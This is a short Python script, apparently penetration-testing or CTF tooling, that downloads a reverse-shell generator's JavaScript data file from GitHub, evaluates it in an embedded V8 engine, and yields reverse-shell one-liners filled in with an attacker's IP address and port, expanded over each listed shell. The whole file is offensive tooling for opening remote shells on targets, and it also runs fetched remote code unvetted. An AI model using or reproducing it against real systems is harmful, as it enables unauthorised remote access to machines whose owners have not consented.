import requests
import STPyV8

def get_revshells(attackbox_ip: str, attackbox_port: int):
    resp = requests.get("https://raw.githubusercontent.com/0dayCTF/reverse-shell-generator/refs/heads/main/js/data.js")

    commands = []
    with STPyV8.JSContext() as ctxt:
        ctxt.eval(resp.text) # Load JS
        commands = ctxt.eval("reverseShellCommands.map(cmd => cmd['command'])")
        shells = ctxt.eval("rsgData['shells']")

        for c in commands:
            c = c.replace("{ip}", attackbox_ip).replace("{port}", f"{attackbox_port}")

            if "\n" in c or "<?php" in c:
                continue

            if "{shell}" not in c:
                yield c
                continue

            for s in shells:
                yield c.replace("{shell}", s)